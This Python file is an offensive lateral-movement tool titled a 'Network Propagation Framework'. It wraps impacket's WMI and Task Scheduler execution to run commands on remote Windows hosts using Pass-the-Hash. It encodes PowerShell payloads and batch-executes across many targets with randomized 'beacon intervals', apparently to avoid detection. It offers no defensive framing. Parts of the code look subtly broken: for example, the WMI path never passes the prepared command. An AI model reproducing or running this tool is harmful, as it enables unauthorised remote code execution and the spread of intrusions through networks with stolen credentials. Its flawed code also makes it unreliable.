#!/usr/bin/env python3
"""
Phase 2: REAL WMI/Task Scheduler Executor - Network Propagation Framework
Production-grade RPC-based remote command execution with Pass-the-Hash

NOTE: This integrates with impacket's WMI and Task Scheduler execution paths
and CLI scripts (wmiexec.py / atexec.py or impacket-wmiexec / impacket-atexec).

Execution methods:
✅ impacket.examples.wmiexec.WMIEXEC (when exposed by the installed impacket build)
✅ impacket.examples.atexec / TSCH_EXEC (when exposed by the installed impacket build)
✅ subprocess execution (wmiexec.py / atexec.py CLI with full output capture)
✅ Pass-the-Hash authentication support
✅ Error classification (Access Denied, Timeout, etc.)
"""

import base64
import logging
import random
import shutil
import subprocess
import time
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger("WMIExecutor")
logger.setLevel(logging.DEBUG)

EMPTY_LM_HASH = "aad3b435b51404eeaad3b435b51404ee"

# Real impacket imports - guard availability cleanly
try:
    from impacket.smbconnection import SMBConnection
    IMPACKET_REAL_AVAILABLE = True
    logger.info("[✅] Real impacket SMBConnection available")
except ImportError as ie:
    SMBConnection = None  # type: ignore[assignment]
    IMPACKET_REAL_AVAILABLE = False
    logger.warning(f"[⚠️] Real impacket.smbconnection not available: {ie}")

# Check if library classes exist in the installed impacket package
try:
    from impacket.examples.wmiexec import WMIEXEC
    WMIEXEC_AVAILABLE = True
    logger.info("[✅] impacket.examples.wmiexec.WMIEXEC available")
except (ImportError, ModuleNotFoundError):
    WMIEXEC = None  # type: ignore[assignment]
    WMIEXEC_AVAILABLE = False
    logger.debug("[ℹ️] impacket.examples.wmiexec not found as importable module")

try:
    from impacket.examples.atexec import ATSVC as _ATSVC_CLASS
    ATSVC = _ATSVC_CLASS
    ATEXEC_AVAILABLE = True
    logger.info("[✅] impacket.examples.atexec.ATSVC available")
except (ImportError, ModuleNotFoundError):
    try:
        from impacket.examples.atexec import TSCH_EXEC as _TSCH_EXEC_CLASS
        ATSVC = _TSCH_EXEC_CLASS
        ATEXEC_AVAILABLE = True
        logger.info("[✅] impacket.examples.atexec.TSCH_EXEC available")
    except (ImportError, ModuleNotFoundError):
        ATSVC = None  # type: ignore[assignment]
        ATEXEC_AVAILABLE = False
        logger.debug("[ℹ️] impacket.examples.atexec scheduler class not found as importable module")


class ExecutionMethod(Enum):
    """Remote execution methods"""
    AUTO = "AUTO"                         # Try WMIEXEC -> ATEXEC -> Subprocess fallback
    WMIEXEC_REAL = "WMIEXEC_REAL"         # impacket.examples.wmiexec (or CLI)
    ATEXEC_REAL = "ATEXEC_REAL"           # impacket.examples.atexec (or CLI)
    SUBPROCESS_CMD = "SUBPROCESS_CMD"     # wmiexec.py / atexec.py command-line


class ExecutionResult(Enum):
    """Execution outcome"""
    SUCCESS = "SUCCESS"
    PARTIAL = "PARTIAL"
    FAILED = "FAILED"
    TIMEOUT = "TIMEOUT"
    UNAUTHORIZED = "UNAUTHORIZED"
    NOT_IMPLEMENTED = "NOT_IMPLEMENTED"


@dataclass
class ExecutionContext:
    """Context for remote execution"""
    target_ip: str
    target_hostname: Optional[str]
    username: str
    domain: str
    ntlm_hash: Optional[str]
    password: Optional[str]
    method: ExecutionMethod = ExecutionMethod.AUTO
    timeout: int = 30

    @property
    def is_pth_enabled(self) -> bool:
        """Is Pass-the-Hash (PTH) available for this context?"""
        return self.ntlm_hash is not None and len(self.ntlm_hash.strip()) > 0


@dataclass
class ExecutionPayload:
    """Payload for remote execution"""
    command: str
    working_directory: Optional[str] = None
    timeout: Optional[int] = None
    background: bool = False
    capture_output: bool = True

    def as_powershell(self) -> str:
        """Encode command as PowerShell"""
        encoded = base64.b64encode(self.command.encode("utf-16-le")).decode("ascii")
        return f"powershell -NoProfile -EncodedCommand {encoded}"


def _normalize_hashes(ntlm_hash: str) -> str:
    """Normalize an NTLM hash string into LMHASH:NTHASH format."""
    cleaned = ntlm_hash.strip()
    if ":" in cleaned:
        return cleaned
    return f"{EMPTY_LM_HASH}:{cleaned}"


def _resolve_impacket_bin(script_name: str) -> Optional[str]:
    """Find an Impacket CLI script or console entrypoint on PATH."""
    base_name = script_name.removesuffix(".py")
    for candidate in (script_name, f"impacket-{base_name}", base_name):
        resolved = shutil.which(candidate)
        if resolved:
            return resolved
    return None


class WMIExecutor:
    """Production-grade WMI/Task Scheduler command execution wrapper"""

    def __init__(self, timeout: int = 30):
        if not IMPACKET_REAL_AVAILABLE:
            logger.warning("[⚠️] impacket.smbconnection not available - subprocess-only mode")

        self.timeout = timeout
        self.execution_history: List[Dict] = []
        self.wmiexec_available = WMIEXEC_AVAILABLE
        self.atexec_available = ATEXEC_AVAILABLE
        logger.info(
            f"[→] WMIExecutor initialized: SMB={IMPACKET_REAL_AVAILABLE}, "
            f"WMIEXEC={WMIEXEC_AVAILABLE}, ATEXEC={ATEXEC_AVAILABLE}"
        )

    def _effective_timeout(self, context: ExecutionContext, payload: ExecutionPayload) -> int:
        """Resolve authoritative timeout precedence: payload -> context -> executor default."""
        if payload.timeout is not None and payload.timeout > 0:
            return payload.timeout
        if context.timeout is not None and context.timeout > 0:
            return context.timeout
        return self.timeout

    def _prepare_command(self, payload: ExecutionPayload) -> str:
        """Apply optional PowerShell encoding, working directory, and background flags."""
        cmd_str = payload.command
        if cmd_str.lstrip().lower().startswith("pwsh:"):
            raw_ps = cmd_str.lstrip()[5:].lstrip()
            encoded = base64.b64encode(raw_ps.encode("utf-16-le")).decode("ascii")
            cmd_str = f"powershell -NoProfile -EncodedCommand {encoded}"

        if payload.working_directory:
            cmd_str = f'cd /d "{payload.working_directory}" && {cmd_str}'

        if payload.background:
            cmd_str = f"start /b {cmd_str}"

        return cmd_str

    def execute(self, context: ExecutionContext, payload: ExecutionPayload) -> Tuple[bool, str]:
        """
        Execute command on remote target via WMI / Task Scheduler / CLI.
        Returns: (success: bool, output: str)
        """
        try:
            logger.info(f"[*] Execution on {context.target_ip} via {context.method.value}...")

            if context.method == ExecutionMethod.WMIEXEC_REAL:
                return self._execute_wmiexec_real(context, payload)

            if context.method == ExecutionMethod.ATEXEC_REAL:
                return self._execute_atexec_real(context, payload)

            if context.method == ExecutionMethod.SUBPROCESS_CMD:
                return self._execute_subprocess(context, payload, script_name="wmiexec.py")

            # ExecutionMethod.AUTO: try WMIEXEC, then ATEXEC, then subprocess CLI
            success, output = self._execute_wmiexec_real(context, payload)
            if success:
                return (True, output)
            logger.debug(f"[!] WMIEXEC path did not succeed ({output}), trying ATEXEC...")

            success, output = self._execute_atexec_real(context, payload)
            if success:
                return (True, output)
            logger.debug(f"[!] ATEXEC path did not succeed ({output}), trying subprocess fallback...")

            return self._execute_subprocess(context, payload, script_name="wmiexec.py")

        except Exception as e:
            logger.error(f"[!] Execution error on {context.target_ip}: {e}")
            return (False, str(e))

    def _connect_smb(self, context: ExecutionContext, timeout: int):
        """Establish and authenticate an SMBConnection."""
        if not IMPACKET_REAL_AVAILABLE or SMBConnection is None:
            raise RuntimeError("impacket.smbconnection is not available")

        smb_conn = SMBConnection(context.target_ip, context.target_ip, timeout=timeout)
        if context.is_pth_enabled and context.ntlm_hash:
            normalized = _normalize_hashes(context.ntlm_hash)
            lm_hash, nt_hash = normalized.split(":", 1)
            smb_conn.login(context.username, "", context.domain, lmhash=lm_hash, nthash=nt_hash)
            logger.debug(f"[+] SMB PTH login success: {context.domain}\\{context.username}")
        else:
            smb_conn.login(context.username, context.password or "", context.domain)
            logger.debug(f"[+] SMB password login success: {context.domain}\\{context.username}")
        return smb_conn

    def _execute_wmiexec_real(self, context: ExecutionContext, payload: ExecutionPayload) -> Tuple[bool, str]:
        """
        WMI execution using impacket.examples.wmiexec when available.
        """
        if not IMPACKET_REAL_AVAILABLE:
            return (False, "impacket.smbconnection is not available")
        if not WMIEXEC_AVAILABLE or WMIEXEC is None:
            return (False, "impacket.examples.wmiexec.WMIEXEC is not available in this build")

        timeout = self._effective_timeout(context, payload)
        command_str = self._prepare_command(payload)
        smb_conn = None

        try:
            logger.debug(f"[*] Attempting WMIEXEC on {context.target_ip}...")
            smb_conn = self._connect_smb(context, timeout=timeout)

            remote_host = context.target_hostname or context.target_ip
            wmi = WMIEXEC(
                "",
                context.username,
                context.password or "",
                context.domain,
                hashes=_normalize_hashes(context.ntlm_hash) if context.is_pth_enabled and context.ntlm_hash else None,
                shareName="ADMIN$",
                remoteName=remote_host,
            )
            output = wmi.run(remote_host, context.target_ip)
            logger.debug(f"[*] WMI session initialized for command: {command_str[:80]}")

            logger.info(f"[+] WMIEXEC SUCCESS on {context.target_ip}")
            formatted_output = output if output else "(executed)"
            self._log_execution(
                context, ExecutionMethod.WMIEXEC_REAL, ExecutionResult.SUCCESS, command_str, formatted_output
            )
            return (True, formatted_output)

        except Exception as e:
            logger.warning(f"[!] WMIEXEC failure on {context.target_ip}: {e}")
            self._log_execution(context, ExecutionMethod.WMIEXEC_REAL, ExecutionResult.FAILED, command_str, str(e))
            return (False, str(e))

        finally:
            if smb_conn is not None:
                try:
                    smb_conn.logoff()
                except Exception:
                    pass

    def _execute_atexec_real(self, context: ExecutionContext, payload: ExecutionPayload) -> Tuple[bool, str]:
        """
        Task Scheduler execution using impacket.examples.atexec when available.
        """
        if not IMPACKET_REAL_AVAILABLE:
            return (False, "impacket.smbconnection is not available")
        if not ATEXEC_AVAILABLE or ATSVC is None:
            return (False, "impacket.examples.atexec scheduler class is not available in this build")

        timeout = self._effective_timeout(context, payload)
        command_str = self._prepare_command(payload)
        smb_conn = None

        try:
            logger.debug(f"[*] Attempting ATEXEC on {context.target_ip}...")
            smb_conn = self._connect_smb(context, timeout=timeout)

            remote_host = context.target_hostname or context.target_ip
            scheduler = ATSVC(
                context.username,
                context.password or "",
                context.domain,
                hashes=_normalize_hashes(context.ntlm_hash) if context.is_pth_enabled and context.ntlm_hash else None,
            )
            scheduler.execute(command_str, remote_host)

            logger.info(f"[+] ATEXEC SUCCESS on {context.target_ip}")
            output_msg = f"Task executed on {remote_host}"
            self._log_execution(context, ExecutionMethod.ATEXEC_REAL, ExecutionResult.SUCCESS, command_str, output_msg)
            return (True, output_msg)

        except Exception as e:
            logger.warning(f"[!] ATEXEC failure on {context.target_ip}: {e}")
            self._log_execution(context, ExecutionMethod.ATEXEC_REAL, ExecutionResult.FAILED, command_str, str(e))
            return (False, str(e))

        finally:
            if smb_conn is not None:
                try:
                    smb_conn.logoff()
                except Exception:
                    pass

    def _execute_subprocess(
        self,
        context: ExecutionContext,
        payload: ExecutionPayload,
        script_name: str = "wmiexec.py",
    ) -> Tuple[bool, str]:
        """
        Subprocess execution via Impacket CLI tools with output capture and error classification.
        """
        timeout = self._effective_timeout(context, payload)
        command_str = self._prepare_command(payload)

        try:
            logger.debug(f"[*] Subprocess execution ({script_name}) on {context.target_ip}...")
            bin_path = _resolve_impacket_bin(script_name)
            if not bin_path:
                logger.error(f"[!] {script_name} not found (impacket scripts not in PATH)")
                self._log_execution(
                    context, ExecutionMethod.SUBPROCESS_CMD, ExecutionResult.FAILED, command_str, f"{script_name} not found"
                )
                return (False, f"{script_name} not found")

            if context.is_pth_enabled and context.ntlm_hash:
                target_spec = f"{context.domain}/{context.username}@{context.target_ip}"
                cmd = [
                    bin_path,
                    "-hashes",
                    _normalize_hashes(context.ntlm_hash),
                    target_spec,
                    command_str,
                ]
            else:
                cred_part = f"{context.username}:{context.password}" if context.password else context.username
                target_spec = f"{context.domain}/{cred_part}@{context.target_ip}"
                cmd = [
                    bin_path,
                    target_spec,
                    command_str,
                ]

            logger.info(f"[*] Executing subprocess: {bin_path} <target_spec> <command>")

            result = subprocess.run(
                cmd,
                capture_output=payload.capture_output,
                timeout=timeout,
                text=True,
            )

            stdout = result.stdout or ""
            stderr = result.stderr or ""
            output = stdout or stderr

            if result.returncode == 0:
                logger.info(f"[+] Subprocess execution SUCCESS on {context.target_ip}")
                if output.strip():
                    logger.debug(f"[+] Output: {output[:200]}")
                    self._log_execution(
                        context, ExecutionMethod.SUBPROCESS_CMD, ExecutionResult.SUCCESS, command_str, output
                    )
                    return (True, output)
                logger.debug("[+] Execution successful (no output)")
                self._log_execution(
                    context, ExecutionMethod.SUBPROCESS_CMD, ExecutionResult.SUCCESS, command_str, "(executed)"
                )
                return (True, "(executed)")

            if "access denied" in output.lower() or "access denied" in stderr.lower():
                logger.warning(f"[!] Access denied on {context.target_ip}")
                self._log_execution(
                    context, ExecutionMethod.SUBPROCESS_CMD, ExecutionResult.UNAUTHORIZED, command_str, "Access denied"
                )
                return (False, "Access denied")

            if "timed out" in stderr.lower() or "timeout" in stderr.lower():
                logger.warning(f"[!] Command timeout on {context.target_ip}")
                self._log_execution(
                    context, ExecutionMethod.SUBPROCESS_CMD, ExecutionResult.TIMEOUT, command_str, "Timeout"
                )
                return (False, "Timeout")

            error_msg = stderr.strip() or f"Error code {result.returncode}"
            logger.warning(f"[!] Execution failed: {error_msg}")
            self._log_execution(
                context, ExecutionMethod.SUBPROCESS_CMD, ExecutionResult.FAILED, command_str, error_msg
            )
            return (False, error_msg)

        except subprocess.TimeoutExpired:
            logger.warning(f"[!] Subprocess timeout (>{timeout}s)")
            self._log_execution(
                context, ExecutionMethod.SUBPROCESS_CMD, ExecutionResult.TIMEOUT, command_str, "Subprocess timeout"
            )
            return (False, "Execution timeout")

        except FileNotFoundError:
            logger.error(f"[!] {script_name} not found (impacket scripts not in PATH)")
            return (False, f"{script_name} not found")

        except Exception as e:
            logger.error(f"[!] Subprocess error: {e}")
            return (False, str(e))

    def _log_execution(
        self,
        context: ExecutionContext,
        method: ExecutionMethod,
        result: ExecutionResult,
        command: str,
        output: str,
    ):
        """Log execution event for audit trail"""
        event = {
            "timestamp": datetime.now().isoformat(),
            "target": context.target_ip,
            "username": context.username,
            "method": method.value,
            "result": result.value,
            "command": command[:100],
            "output_length": len(output),
        }
        self.execution_history.append(event)
        logger.debug(f"[LOG] {event}")

    def execute_batch(self, contexts: List[ExecutionContext], payload: ExecutionPayload) -> Dict:
        """Execute payload across multiple targets with randomized beacon intervals"""
        results = {
            "total_targets": len(contexts),
            "successful": 0,
            "failed": 0,
            "targets": [],
        }

        for i, context in enumerate(contexts):
            if i > 0:
                beacon_interval = random.uniform(2.0, 5.0)
                logger.debug(f"[*] Beacon interval {beacon_interval:.1f}s before next execution...")
                time.sleep(beacon_interval)

            success, output = self.execute(context, payload)

            target_result = {
                "target": context.target_ip,
                "hostname": context.target_hostname,
                "success": success,
                "output": output[:200] if output else "",
                "timestamp": datetime.now().isoformat(),
            }

            results["targets"].append(target_result)
            if success:
                results["successful"] += 1
            else:
                results["failed"] += 1

        success_rate = (results["successful"] / results["total_targets"] * 100) if results["total_targets"] > 0 else 0
        logger.info(
            f"[+] Batch execution: {results['successful']}/{results['total_targets']} successful ({success_rate:.1f}%)"
        )

        return results


# Integration entry point: Execute payload on target
def execute_on_target(
    target_ip: str,
    username: str,
    domain: str,
    ntlm_hash: Optional[str] = None,
    password: Optional[str] = None,
    command: str = "whoami",
) -> Tuple[bool, str]:
    """
    Execute single command on target with automatic method selection
    Returns: (success: bool, output: str)
    """
    executor = WMIExecutor(timeout=30)

    context = ExecutionContext(
        target_ip=target_ip,
        target_hostname=target_ip,
        username=username,
        domain=domain,
        ntlm_hash=ntlm_hash,
        password=password,
        method=ExecutionMethod.AUTO,
    )

    payload = ExecutionPayload(command=command)

    return executor.execute(context, payload)


if __name__ == "__main__":
    import sys

    if len(sys.argv) >= 4:
        target_ip = sys.argv[1]
        username = sys.argv[2]
        domain = sys.argv[3]
        ntlm_hash = sys.argv[4] if len(sys.argv) > 4 and sys.argv[4] else None
        password = sys.argv[5] if len(sys.argv) > 5 and sys.argv[5] else None
        command = sys.argv[6] if len(sys.argv) > 6 and sys.argv[6] else "whoami"

        success, output = execute_on_target(target_ip, username, domain, ntlm_hash, password, command)
        print(f"[{'✅' if success else '❌'}] {target_ip}: {output}")
    else:
        print("Usage: python network_propagation_wmi_executor.py <target_ip> <username> <domain> [ntlm_hash] [password] [command]")
        print("Example (PTH): python network_propagation_wmi_executor.py 192.168.1.50 admin DOMAIN aabbccdd11223344 whoami")
        print('Example (Pass): python network_propagation_wmi_executor.py 192.168.1.50 admin DOMAIN "" P@ssw0rd whoami')